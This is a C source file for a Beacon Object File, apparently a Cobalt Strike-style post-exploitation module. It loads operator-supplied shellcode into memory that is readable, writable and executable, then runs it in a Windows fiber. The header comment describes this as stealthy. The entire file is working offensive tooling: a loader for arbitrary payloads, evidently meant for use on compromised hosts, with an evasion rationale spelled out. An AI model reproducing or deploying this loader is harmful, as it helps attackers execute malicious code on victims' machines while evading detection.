/*
 * shellcode_exec_fiber.c - Shellcode execution via Fiber.
 *
 * Uses Windows Fiber API to execute shellcode in a fiber context.
 * Stealthy as fibers are legitimate Windows threading primitives.
 *
 * Build (MinGW-w64):
 *   x86_64-w64-mingw32-gcc -c shellcode_exec_fiber.c -o shellcode_exec_fiber.o
 *
 * Usage from server:
 *   Upload shellcode_exec_fiber.o, set args = raw shellcode bytes
 */

#include <windows.h>
#include "beacon.h"

typedef VOID (WINAPI *PFIBER_START_ROUTINE)(LPVOID lpFiberParameter);

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$ConvertThreadToFiber(LPVOID);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$CreateFiber(SIZE_T, PFIBER_START_ROUTINE, LPVOID);
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$SwitchToFiber(LPVOID);
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$DeleteFiber(LPVOID);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);

#define MEM_COMMIT_VAL     0x00001000
#define MEM_RESERVE_VAL    0x00002000
#define MEM_RELEASE_VAL    0x00008000
#define PAGE_EXECUTE_READWRITE_VAL 0x40

static void bof_memcpy(void* dst, const void* src, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
}

/* Thread function that runs fiber */
static DWORD WINAPI fiber_thread_func(LPVOID param) {
    LPVOID exec_mem = param;

    /* Convert this thread to fiber */
    LPVOID main_fiber = KERNEL32$ConvertThreadToFiber(NULL);
    if (!main_fiber) {
        return 1;
    }

    /* Create fiber with shellcode */
    LPVOID shellcode_fiber = KERNEL32$CreateFiber(0, (PFIBER_START_ROUTINE)exec_mem, NULL);
    if (!shellcode_fiber) {
        return 2;
    }

    /* Execute shellcode in fiber context */
    KERNEL32$SwitchToFiber(shellcode_fiber);

    /* If we get here, shellcode returned (unlikely for MSF) */
    KERNEL32$DeleteFiber(shellcode_fiber);
    return 0;
}

void go(char* args, int alen)
{
    char* shellcode_data = NULL;
    int shellcode_len = 0;

    if (args != NULL && alen >= 2) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        shellcode_data = BeaconDataExtract(&parser, &shellcode_len);
    }

    if (shellcode_data == NULL || shellcode_len <= 0) {
        BeaconOutput(CALLBACK_ERROR, "No shellcode provided\n", 21);
        return;
    }

    if (shellcode_len > 10 * 1024 * 1024) {
        BeaconOutput(CALLBACK_ERROR, "Shellcode too large (max 10MB)\n", 32);
        return;
    }

    /* Allocate RWX memory */
    LPVOID exec_mem = KERNEL32$VirtualAlloc(
        NULL,
        shellcode_len,
        MEM_COMMIT_VAL | MEM_RESERVE_VAL,
        PAGE_EXECUTE_READWRITE_VAL
    );

    if (exec_mem == NULL) {
        BeaconOutput(CALLBACK_ERROR, "VirtualAlloc failed\n", 20);
        return;
    }

    /* Copy shellcode */
    bof_memcpy(exec_mem, shellcode_data, shellcode_len);

    /* Create thread to run fiber (avoid blocking BOF thread) */
    HANDLE hThread = KERNEL32$CreateThread(NULL, 0, fiber_thread_func, exec_mem, 0, NULL);
    if (!hThread) {
        BeaconOutput(CALLBACK_ERROR, "CreateThread failed\n", 20);
        KERNEL32$VirtualFree(exec_mem, 0, MEM_RELEASE_VAL);
        return;
    }

    /* Don't close handle or free memory - keep everything alive */
    BeaconOutput(CALLBACK_OUTPUT, "Shellcode fiber started in thread\n", 35);

    /* Note: Memory and handle are intentionally leaked */
}
